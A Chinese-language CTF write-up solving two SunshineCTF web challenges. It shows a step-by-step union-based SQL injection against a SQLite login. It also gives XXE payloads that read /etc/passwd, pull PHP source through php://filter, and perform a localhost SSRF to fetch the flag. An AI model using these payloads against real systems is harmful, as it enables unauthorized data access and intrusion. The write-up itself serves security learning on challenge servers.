[TOC]

## WrestlerBook

![](./images/wrestlerbook(1).jpg)

[题目链接](<http://archive.sunshinectf.org:19006/>)

题目入口是一个登陆界面

![](./images/wrestlerbook(2).jpg)

顺手一条万能密码，出现了错误信息：

![](./images/wrestlerbook(3).jpg)

![](./images/wrestlerbook(4).jpg)

SQLite数据库，`#`注释符报错，换成`--`后成功登陆

![](./images/wrestlerbook(5).jpg)

但翻了一圈也没找到什么有用的东西。后猜测flag可能在数据库中，返回登陆界面，进行注入尝试，没发现什么过滤，一路顺下来就找到了flag，过程如下（payload是指登陆的用户名，passwd随意）：

-  payload1

  `admin' order by 10--`

  ![](./images/wrestlerbook(6).jpg)

  错误信息直接给出了原`select`所查询的列数。

- payload2

  `admin' union select 1,2,3,4,5,6,7,8--`

  ![](./images/wrestlerbook(10).jpg)

  下面选择7号显示位。

- payload3

  `admin' union select 1,2,3,4,5,6,group_concat(tbl_name),8 from sqlite_master--`

  ![](./images/wrestlerbook(7).jpg)

- payload4

  `admin' union select 1,2,3,4,5,6,sql,8 from sqlite_master where tbl_name='users'--`

  ![](./images/wrestlerbook(8).jpg)

  可以看到`users`表中有`flag`字段。

- payload5

  `admin' union select 1,2,3,4,5,6,group_concat(flag),8 from users-- `

  结果有点多，可以在网页源码中查看（或者查询的时候加上`distinct`）

  ![](./images/wrestlerbook(9).jpg)

## Wrestler Name Generator

![](./images/name_generate(1).jpg)  

[题目链接](<http://archive.sunshinectf.org:19007/>)

花里胡哨的名字生成界面

![](./images/name_generate(2).jpg)

输点东西提交后获得一个`Wrestler Name`

![](./images/name_generate(3).jpg)

这里注意到`url`，以`GET`方式传了个`input`参数，参数值有点东西：

`input=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48aW5wdXQ%2BPGZpcnN0TmFtZT5oZWxsbzwvZmlyc3ROYW1lPjxsYXN0TmFtZT53b3JsZDwvbGFzdE5hbWU%2BPC9pbnB1dD4%3D`

`base64decode(urldecode(input))`得到如下内容：

```xml
<?xml version='1.0' encoding='UTF-8'?>
<input>
    <firstName>hello</firstName>
    <lastName>world</lastName>
</input>
```

`xml`！，先`xxe`探测一波，拿出祖传的`xxe`payload：

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///etc/passwd">]>
<input>
    <firstName>&bar;</firstName>
    <lastName>world</lastName>
</input>
```

反向编码回去，获得新的`input`：

`input=PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgYmFyIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPgo8aW5wdXQ%2bCiAgICA8Zmlyc3ROYW1lPiZiYXI7PC9maXJzdE5hbWU%2bCiAgICA8bGFzdE5hbWU%2bd29ybGQ8L2xhc3ROYW1lPgo8L2lucHV0Pg%3d%3d`

发送请求后就成功读取了`passwd`文件，可见`xxe`行得通。

![](./images/name_generate(4).jpg)

接着有试着读取服务器根目下的flag文件，不过失败了，好像没有。

后来在接收`input`参数的`generate.php`文件中找到了线索。虽然不知道`generate.php`在服务器上的存储路径，但我们可以通过`php`伪协议来读取：

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE foo [<!ENTITY bar SYSTEM "php://filter/read=convert.base64-encode/resource=generate.php">]>
<input>
    <firstName>&bar;</firstName>
    <lastName>world</lastName>
</input>
```

拿到源码如下：

```php
<?php

$whitelist = array(
    '127.0.0.1',
    '::1'
);
// if this page is accessed from the web server, the flag is returned
// flag is in env variable to avoid people using XXE to read the flag
// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)
if(in_array($_SERVER['REMOTE_ADDR'], $whitelist)){
	echo $_ENV["FLAG"];
	return;
}
// make sure the input parameter exists
if (empty($_GET["input"])) {
	echo "Please include the 'input' get parameter with your request, Brother";
	return;
}

// get input
$xmlData = base64_decode($_GET["input"]);
// parse xml
$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die("Error parsing XML: "."\n".$xmlData);
$firstName = $xml->firstName;
$lastName = $xml->lastName;
// generate name
$nouns = array("Killer", "Savage", "Stallion", "Coder", "Hacker", "Slasher", "Crusher", "Barbarian", "Ferocious", "Fierce", "Vicious", "Hunter", "Brute", "Tactician", "Expert");
$noun = $nouns[array_rand($nouns)];
$generatedName = $firstName.' "The '.$noun.'" '.$lastName;

// return html for the results page
echo <<<EOT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>$generatedName</h2> 
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a> 
</div>
</body>
</html>
EOT;
?>
```

其中第7行的注释告诉我们，通过服务器本地访问网站的`generate.php`文件即可拿到flag，那么接下来通过`xxe`进行依次简单的`SSRF`即可，payload如下：

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE foo [<!ENTITY bar SYSTEM "http://localhost/generate.php">]>
<input>
    <firstName>&bar;</firstName>
    <lastName>world</lastName>
</input>
```

![](./images/name_generate(5).jpg)